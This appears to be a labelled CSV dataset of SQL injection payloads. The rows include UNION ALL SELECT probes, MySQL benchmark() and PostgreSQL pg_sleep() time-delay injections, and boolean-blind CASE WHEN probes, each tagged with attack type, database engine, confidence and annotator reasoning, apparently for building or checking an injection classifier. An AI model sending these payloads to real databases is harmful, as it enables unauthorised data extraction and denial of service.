payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"-5700 where 4238 = 4238 union all select 4238,4238,4238#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,800,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5700 where 4238 = 4238 union all select 4238,4238,4238#"
"1'+ ( select 'zirh' where 9054 = 9054 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) ) +'",time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,801,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1'+ ( select 'zirh' where 9054 = 9054 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) ) +'"
"1'|| ( select 'cjwp' where 8681 = 8681 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) ) ||'",time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,802,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1'|| ( select 'cjwp' where 8681 = 8681 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) ) ||'"
"1 ) ) ) union all select null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,803,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) ) ) union all select null,null,null,null,null--"
"-4856' in boolean mode ) union all select 1074,1074,1074,1074,1074,1074,1074#",union_based,generic,0.85,UNION in boolean mode for union-based,KEEP,,union_based,generic,804,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-4856' in boolean mode ) union all select 1074,1074,1074,1074,1074,1074,1074#"
"-8080"" ) as nlos where 8917 = 8917 union all select 8917,8917,8917,8917--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,805,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-8080"" ) as nlos where 8917 = 8917 union all select 8917,8917,8917,8917--"
select ( case when ( 7217 = 7631 ) then 7217 else 7217* ( select 7217 from information_schema.character_sets ) end ) #,boolean_blind,mysql,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,mysql,806,boolean_blind,mysql,generic SQL keywords without specific signal,boolean_blind,mysql,generic SQL structure without strong signal,select ( case when ( 7217 = 7631 ) then 7217 else 7217* ( select 7217 from information_schema.character_sets ) end ) #
select pg_sleep ( 5 ) and ( ( ( 'xobx' = 'xobx,time_blind,postgresql,0.9,pg_sleep() for time blind,KEEP,,time_blind,postgresql,807,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,select pg_sleep ( 5 ) and ( ( ( 'xobx' = 'xobx
"-8902 union all select 4339,4339,4339#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,808,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-8902 union all select 4339,4339,4339#"
"elt ( 5953 = 5953,1 )",boolean_blind,generic,0.8,elt() for boolean blind,KEEP,,boolean_blind,generic,809,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"elt ( 5953 = 5953,1 )"
"1' ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( 'ffzv' = 'ffzv",time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,810,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( 'ffzv' = 'ffzv"
-3431%' ) or 9323 = 9323#,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,811,boolean_blind,generic,Pattern match: 'or 9323 = 9323' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-3431%' ) or 9323 = 9323#
"1"" ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,812,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" ) union all select null,null,null,null,null,null,null,null,null,null--"
1 ) as zzip where 5353 = 5353 and 3394 = 3092,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,813,boolean_blind,generic,Pattern match: 'and 3394 = 3092' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1 ) as zzip where 5353 = 5353 and 3394 = 3092
-5774' where 3632 = 3632 or ( 3177 = 4222 ) *4222--,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,814,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,-5774' where 3632 = 3632 or ( 3177 = 4222 ) *4222--
"1%"" ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""%"" = """,boolean_blind,generic,0.8,IN with char concatenation for blind,KEEP,,boolean_blind,generic,815,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1%"" ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""%"" = """
"1"" ) where 7165 = 7165 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,816,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" ) where 7165 = 7165 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --"
